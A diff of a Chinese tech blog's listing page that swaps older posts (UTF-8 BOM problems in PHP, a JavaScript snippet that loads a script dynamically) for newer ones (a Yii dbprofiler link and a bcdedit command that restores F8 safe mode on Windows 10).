+              <time title="创建时间：2020-08-24 13:00:00" itemprop="dateCreated datePublished" datetime="2020-08-24T13:00:00+08:00">2020-08-24</time>
             </span>
 
           
@@ -435,13 +405,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>旧版本的 windows 自带的记事本（新版已经没了），在保存一个以 UTF-8 编码的文件时，会在文件开始的地方插入三个不可见的字符（0xEF 0xBB 0xBF，即BOM）。</p>
-<p>它是一串隐藏的字符，用于让记事本等编辑器识别这个文件是否以 UTF-8 编码。对于一般的文本文件，这样并不会产生什么麻烦。但对于 PHP 代码来说，BOM 是个大麻烦。</p>
-<p>PHP并不会忽略BOM，所以在读取、包含或者引用这些文件时，会把 BOM 作为该文件开头正文的一部分。根据html混编语言的特点，这串字符将被直接执行（显示）出来。由此造成即使页面的 top padding 设置为0，也无法让整个网页紧贴浏览器顶部，因为在html一开头有这3个字符呢！</p>
-<p>而且 BOM 是内容输入，如果没有开启缓冲区输出的时候，BOM 会影响 header 函数的使用，因为在header之前不能有任何有效的内容输出，BOM也算是有效内容输出。</p>
-<p>去掉BOM的方法，建议使用专业的代码编辑器工具来处理 例如 Notepad++ 或者 EditPlus 在新建和保存以及转换编码的功能内都会有无 BOM的格式选择。</p>
-<p>shell下可以利用 sed 命令来处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;0,/s/^\xEF\xBB\xBF//&#x27; 文本文件.txt</span><br></pre></td></tr></table></figure>
+          <p>官方文档 <a target="_blank" rel="noopener" href="https://www.yiiframework.com/extension/dbprofiler">https://www.yiiframework.com/extension/dbprofiler</a></p>
+<p>配置起来比较麻烦，不像其他框架那样有 last sql</p>
+
       
     </div>
 
@@ -460,7 +426,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/06/27/JavaScript%20%E5%8A%A8%E6%80%81%E7%9A%84%E5%9C%A8%E9%A1%B5%E9%9D%A2%E9%87%8C%E6%8F%92%E5%85%A5%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2020/08/24/win10-%E6%81%A2%E5%A4%8D%E5%BC%80%E6%9C%BA-F8-%E8%BF%9B%E5%85%A5%E5%AE%89%E5%85%A8%E6%A8%A1%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -474,7 +440,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/06/27/JavaScript%20%E5%8A%A8%E6%80%81%E7%9A%84%E5%9C%A8%E9%A1%B5%E9%9D%A2%E9%87%8C%E6%8F%92%E5%85%A5%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">jS动态的在页面里插入脚本文件</a>
+            <a href="/2020/08/24/win10-%E6%81%A2%E5%A4%8D%E5%BC%80%E6%9C%BA-F8-%E8%BF%9B%E5%85%A5%E5%AE%89%E5%85%A8%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">win10 恢复开机 F8 进入安全模式</a>
         </h2>
 
         <div class="post-meta">
@@ -484,7 +450,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-06-27 11:07:00" itemprop="dateCreated datePublished" datetime="2018-06-27T11:07:00+08:00">2018-06-27</time>
+              <time title="创建时间：2020-08-24 12:53:00" itemprop="dateCreated datePublished" datetime="2020-08-24T12:53:00+08:00">2020-08-24</time>
             </span>
 
           
@@ -498,9 +464,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> obj = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  obj.<span class="property">type</span> = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">  obj.<span class="property">src</span> = <span class="string">&quot;https://your_script_file.js&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(obj);</span><br><span class="line">&#125; ());</span><br></pre></td></tr></table></figure>
-<p>按钮化</p>
-<p><code>&lt;a href=&#39;javascript:(function()&#123;var a=document.createElement(&quot;script&quot;);a.type=&quot;text/javascript&quot;;a.src=&quot;https://your_script_file.js&quot;;document.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;());&#39;&gt;插入&lt;/a&gt;</code></p>
+          <p>管理员身份启动 cmd 输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set &#123;default&#125; bootmenupolicy legacy</span><br></pre></td></tr></table></figure>
+<p>回车后 重启测试 </p>
+<p>我看不懂这个命令，好像是把启动改成 legacy 这么搞不一定支持所有的 BIOS 设置或者笔记本电脑的 BIOS 兼容legacy 的启动，慎用。除非你真的明白 legacy 和 uefi 启动如何切换&#x2F;修复。</p>
 
       
     </div>
@@ -519,7 +486,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -585,14 +552,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">117</span>
+          <span class="site-state-item-count">147</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">180</span>
+        <span class="site-state-item-count">216</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
